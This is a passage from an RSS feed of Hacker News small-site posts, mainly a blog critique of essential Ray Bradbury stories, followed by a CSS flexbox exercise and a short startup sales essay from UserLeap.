          <p><img data-src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550445266589-W6E84TP8S4U0BB58L3F7/ke17ZwdGBToddI8pDm48kJ5lO69Xq2dtpo5lPy1lHTx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UaEAvh_lnjoYyE0Sqhj2kZbWoqJFgLgSux6sojh3xhhN2vILF1okCOvBQjrqH7Fjpg/440571710.0.x.jpg" data-image="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550445266589-W6E84TP8S4U0BB58L3F7/ke17ZwdGBToddI8pDm48kJ5lO69Xq2dtpo5lPy1lHTx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UaEAvh_lnjoYyE0Sqhj2kZbWoqJFgLgSux6sojh3xhhN2vILF1okCOvBQjrqH7Fjpg/440571710.0.x.jpg" data-image-dimensions="1752x2576" data-image-focal-point="0.5,0.5" alt="440571710.0.x.jpg" data-load="false" data-image-id="5c69eacfeb39312979d92afc" data-type="image" src="http://www.samweller.net/bradbury-1/2018/11/29/440571710.0.x.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1550443716450_17081"><div><p><span>Plot Synopsis</span>: A young screenwriter at work in Ireland in 1953 discovers that his ever-reliable regular taxicab driver has become dangerous and impaired when behind the wheel. Nick, the village driver, escorts the young writer from Dublin to the Irish countryside and the estate of the young screenwriter’s director. Nick then waits at the local pub until the writer is ready to be driven back to the city. There is never a problem, until the first night of Lent. . . .</p><p><span>Critique</span>: Any “essential” list of Bradbury short stories must include an Irish tale (as well as a Mexico story, a Mars story, and a Green Town story, for that matter). The problem is, of course, <em>which</em> Irish story? I choose this one for two simple reasons. First, Bradbury takes the lyrical quality of his voice and drenches it in a poetic and authentic Irish brogue.</p><p><em>Nick, now</em>. <em>See his easy hands loving the wheel in a slow clocklike turning as soft and silent as winter constellations snow down the sky. Listen to his mist-breathing voice all night-quiet as he charms the road, his foot a tenderly benevolent pat on the whispering accelerator, never a mile under thirty, never two miles over. Nick, Nick and his steady boat gentling a mild sweet lake where all Time slumbers. Look, compare. And bind such a man to you with summer grasses, gift him with silver, shake his hand warmly at each journey’s end</em></p><p><em>“Good night, Nick,” I said at the hotel. “See you tomorrow.”</em></p><p><em>“God willing,” whispered Nick</em></p><p><em>And he drove softly away.</em></p><p>The second reason I have selected this story for “The Essential Bradbury” list is that this is the first Irish story Bradbury wrote. It is his first creation, fresh-removed and newly-minted from his own actual experiences of living in Dublin in the autumn of 1953 and the winter of 1954, writing the screenplay for <em>Moby Dick</em> for film director John Huston. From a biographical standpoint, it is fascinating to read a work of short fiction that is, ostensibly, memoir. And with “The First Night of Lent,” Bradbury had discovered a trove of material that would continue to yield rich story, culminating in the publication of the 1992 semi-autobiographical novel, <em>Green Shadow, White Whale</em>, a minor-class</p><p><span>The Beginning of the Irish Stories</span>: As Ray recalled, one night after he had returned from Ireland, he was in bed and a voice spoke to him</p><p>“Ray, darling!”</p><p>Ray responded, “Who is it?” </p><p>And the voice said, “It’s Nick, the cab driver who drove you back and forth from Dublin to Kilcock 80 or 90 times. Do you remember that, Ray? Do you?” </p><p>And Ray said, “Yes?”</p><p>And the voice said, “Would you mind puttin’ it down?” </p><p>So Ray Bradbury started writing his Irish stories, beginning with “The First Night of Lent.”</p><p><span>Historical Aside</span>: A fascinating <em>New York Times </em>article on John Huston’s Georgian Irish Manor, ran June 12, 2012. Check it out <a href="http://www.nytimes.com/2012/06/15/greathomesanddestinations/15iht-reireland15.html">here</a>.</p><p>This is the very house where, in 1953, Nick the cab driver picked Bradbury up late at night, to drive him back to Dublin. This is the very house where Ray say with John Huston, late into the Irish night, as Huston went over Ray’s adaptation of <em>Moby Dick</em>.</p><p><strong>#24 “THE SOUND OF SUMMER RUNNING”</strong></p><p><span>Where to Find It</span>:<em> Dandelion Wine</em>, <em>The Stories of Ray Bradbury</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550446114005_16095"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550446250953-C38R892LM92RLJ0IFCQN/ke17ZwdGBToddI8pDm48kBeOurrnhyeZYlyEeER2mxtZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVH-Ask3FRJIA38qhKz88m6J7At5I9ts1__JJprJ--S1DQbHOnfMQAbUDGB8JxudeQQ/illustration_2010_08_02_summer_in_the_air.jpg" data-image="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550446250953-C38R892LM92RLJ0IFCQN/ke17ZwdGBToddI8pDm48kBeOurrnhyeZYlyEeER2mxtZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVH-Ask3FRJIA38qhKz88m6J7At5I9ts1__JJprJ--S1DQbHOnfMQAbUDGB8JxudeQQ/illustration_2010_08_02_summer_in_the_air.jpg" data-image-dimensions="368x387" data-image-focal-point="0.5,0.5" alt="The illustration by Amos Sewell that accompanied the original publication of “Summer in the Air,” in the February 1956 issue of  Saturday Evening Post ." data-load="false" data-image-id="5c69eeaa0d92979b8b80b8dc" data-type="image" src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1550446250953-C38R892LM92RLJ0IFCQN/ke17ZwdGBToddI8pDm48kBeOurrnhyeZYlyEeER2mxtZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVH-Ask3FRJIA38qhKz88m6J7At5I9ts1__JJprJ--S1DQbHOnfMQAbUDGB8JxudeQQ/illustration_2010_08_02_summer_in_the_air.jpg">
          </p>
        
          
        

        
          
          <figcaption>
            <p>The illustration by Amos Sewell that accompanied the original publication of “Summer in the Air,” in the February 1956 issue of <em>Saturday Evening Post</em>.</p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1550446114005_18693"><div><p><span>First Published as</span>: “Summer in the Air,” <em>The Saturday Evening Post</em>, February 18, 1956 </p><p><span>Plot Synopsis</span>: At the beginning of summer, 1928, Douglas Spaulding sees a pair of brand new tennis shoes in a storefront window. His shoes are worn out, his feet feel heavy, and he is convinced that this resplendent pair of Cream-Sponge Para Litefoot Shoes will change his summer forever.</p><p><span>Backstory</span>: Ray Bradbury on the origins of the story from <em>Listen to the Echoes: The Ray Bradbury Interviews</em>: </p><p>“I was on a bus going into Westwood a few years ago, and a young boy jumped on the bus, threw his money in the box, raced down the aisle, and threw himself into a seat across from me.&nbsp; And I looked at him, and I said, ‘My god, if I had his energy, I could write a poem every day, a story every week, a novel every month.&nbsp; What’s his secret?’&nbsp; I looked down at his feet.&nbsp; He had the brightest pair of new fresh tennis shoes on his feet.&nbsp; And I said, oh, my god, I can remember when I was a kid, my father taking me downtown and buying me my first pair of new summer tennis shoes.&nbsp; I went home, and I wrote the short story.”</p><p><span>Critique</span>: This story is a shining example of Bradbury’s range as a literary writer. The man did not need an otherworldly landscape or elements of the fantastic to meditate on the human experience. Bradbury found magic in the every day, in this case, in a new pair of tennis shoes and the perspective of youth. The best Bradbury, in my opinion, is rooted in unforgettable story with a philosophical question at its center, all told in his singular, poetic style.</p><p><span>The Prose</span>: <em>Somehow the people who made tennis shoes knew what boys needed and wanted. They put marshmallows and coiled springs in the soles and they wove the rest out of grasses bleached and fired in the wilderness. Somewhere deep in the soft loam of the shoes the thin hard sinews of the buck deer were hidden. The people that made the shoes must have watched a lot of winds blow the trees and a lot of rivers going down to the lakes. Whatever it was, it was in the shoes, and it was summer.</em></p><p><br> <strong>#23 “THE LONG RAIN”</strong></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1553888873530_11881"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1553889142081-4YDUJY5EY92L2GEQK67F/ke17ZwdGBToddI8pDm48kE9vdaUtW8eSyhB82tvO9N97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTm7jWdqqvv6kr2zx2NswsomEsuHjXNafnlMhtqHse04OG5RdS43L90lwVSOToIGiP0/r-is-for-rocket-s-is-for-space-signed-traycased-hardcover-by-ray-bradbury-%5B3%5D-4726-p.png" data-image="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1553889142081-4YDUJY5EY92L2GEQK67F/ke17ZwdGBToddI8pDm48kE9vdaUtW8eSyhB82tvO9N97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTm7jWdqqvv6kr2zx2NswsomEsuHjXNafnlMhtqHse04OG5RdS43L90lwVSOToIGiP0/r-is-for-rocket-s-is-for-space-signed-traycased-hardcover-by-ray-bradbury-%5B3%5D-4726-p.png" data-image-dimensions="1439x1033" data-image-focal-point="0.5,0.5" alt="r-is-for-rocket-s-is-for-space-signed-traycased-hardcover-by-ray-bradbury-[3]-4726-p.png" data-load="false" data-image-id="5c9e7771e2c483fa41a9dcdd" data-type="image" src="http://www.samweller.net/bradbury-1/2018/11/29/r-is-for-rocket-s-is-for-space-signed-traycased-hardcover-by-ray-bradbury-[3]-4726-p.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1553888873530_14891"><div><p><span>Where to Find It</span>:<em> The Illustrated Man,</em> <em>The Stories of Ray Bradbury</em></p><p><span>First Published</span>: As “Death-by-Rain” in <em>Planet Stories</em>, September, 1950.<em> </em></p><p><span>Plot Synopsis</span>: Ray Bradbury writes a Jack London story set on Venus. A marooned crew on the perpetually rain-saturated planet march through the thick and endless planetary jungle world desperately seeking a sun-dome, a man-made structure built by colonists that provides warmth, provisions and respite from the infinite rain.</p><p><span>Cinematic History</span>: Director Jack Smight brought the story to the screen in the 1969 adaptation of the<em> Illustrated Man, </em>a critical and box-office disaster. </p><p><span>Personal Anecdote</span>: No question, this is classic Bradbury. But I am also partial to it. “The Long Rain” is the first Ray Bradbury story I ever read. I was 11-years-old and I was never the same again.</p><p><span>Passage of Exemplary Bradburian Prose:</span> <em>"It was a hard rain, a perpetual rain, a sweating and steaming rain; it was a mizzle, a downpour, a fountain, a whipping in the eyes, an undertow at the ankles; it was a rain to drown all rains and the memory of rains."</em></p><p><span>Th…</span></p></div></div></div></div></div></div></div></div></article></section></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury">http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury</a></em></p>]]>
            </description>
            <link>http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury</link>
            <guid isPermaLink="false">hacker-news-small-sites-23697573</guid>
            <pubDate>Wed, 01 Jul 2020 03:50:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Skill Set Visualization D3.js]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23696874">thread link</a>) | @moxylush
<br/>
June 30, 2020 | https://thescottkrause.com/d3_datavis_skills.html | <a href="https://web.archive.org/web/*/https://thescottkrause.com/d3_datavis_skills.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://thescottkrause.com/d3_datavis_skills.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23696874</guid>
            <pubDate>Wed, 01 Jul 2020 01:52:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: CSSKatas – A better way to sharpen your CSS skills]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23696776">thread link</a>) | @dsdshcym
<br/>
June 30, 2020 | https://yiming.dev/css-katas/ | <a href="https://web.archive.org/web/*/https://yiming.dev/css-katas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <div>
                  <p>
                    Congratulations! You've learned how to set paddings and
                    colors.
                  </p>
                  <p>
                    In this last demo, we'll learn something more complicated:
                    how to align two buttons.
                  </p>
                  <p>
                    Modify the code below to make the upper buttons match the
                    design below.
                  </p>
                  <details>
                    <summary>Hint</summary>
                    This
                    <code>buttons-container</code>
                    is a flexbox. Check
                    <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/justify-content">
                      justify-content - CSS: Cascading Style Sheets - MDN
                    </a>
                    for how to control spaces between these two buttons.
                  </details>
                </div>
              </div></div>]]>
            </description>
            <link>https://yiming.dev/css-katas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23696776</guid>
            <pubDate>Wed, 01 Jul 2020 01:30:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If Your Company Is Winning, Keep Reading]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23696631">thread link</a>) | @ryanglasgow
<br/>
June 30, 2020 | https://userleap.com/post/if-your-company-is-winning-keep-reading.html | <a href="https://web.archive.org/web/*/https://userleap.com/post/if-your-company-is-winning-keep-reading.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
  
  <div>
    <p><img src="https://userleap.com/blog/content/images/2020/06/winning.png">
    </p>
    <div>
      <p>A fascinating pattern has started to emerge while growing UserLeap. </p><p>When I meet with a winning company and show them our product? Their eyes light up and they immediately get it.</p><p>The company is almost always a category leader, or quickly on its way. Often, their app is on my phone home screen. The press constantly writes about them. Customers rave about their product. Awards are the norm. Everyone knows who they are. I’m giddy just speaking with them. </p><p>But there’s no selling necessary. Budget is rarely an issue. I meet with them for 30 minutes and they move right into a trial. </p><p>The struggling companies? Their startup isn’t taking off. Growth has plateaued. The stock price is declining. Competitors are stealing customers.</p><p>When I meet with these companies it’s always a challenging conversation. They say there are other priorities. I realize it’ll be a long sales cycle. They rarely move forward. </p><p>Those winners? They’re winning because they understand their customer — and better than anyone else. Customer motivations. Inner fears. Challenges. Habits.</p><p>Their top priority is their customer. It was from day one. It's why they became successful. It’s why they’re winning today. It’s how they know they’ll continue to win—every day. UserLeap is the ideal solution that puts their customer first and drives customer-informed decision making across their company.</p><p>The struggling companies? Their customers are a priority tomorrow. Or next quarter. Or next year. Right now, something else is more important. Internal politics. A logo redesign. A press write up. An internal promotion. The next Forbes list. Our product offers little value to them. They say the budget is full. </p><p>I may never figure out how to sell to struggling companies. And that maybe that’s ok.</p>
    </div>
  </div>
  <div>
    
    <div>
      <div>
        <div>
          <p><img src="https://www.gravatar.com/avatar/0db9a64b871850b876999969c535d67c?s=250&amp;d=mm&amp;r=x"></p>
          
          
        </div>
        <div>
          <h3>About the Author</h3>
          <p>
            Survey fanatic and customer experience advocate. Former Research
            Director at Yale School of Management and Senior Research Manager at
            Etsy. Bucknell and University of Chicago alum.
          </p>
          <h3>Ryan Glasgow</h3>
        </div>
      </div>
    </div>
    
    <div>
      <p>
        UserLeap lets you run targeted, in-product microsurveys on everything
        from new features to churn with the analysis done for you—all by adding
        a simple code snippet to your product.
      </p>
      
    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://userleap.com/post/if-your-company-is-winning-keep-reading.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23696631</guid>
            <pubDate>Wed, 01 Jul 2020 01:01:34 GMT</pubDate>
        </item>
    </channel>
</rss>
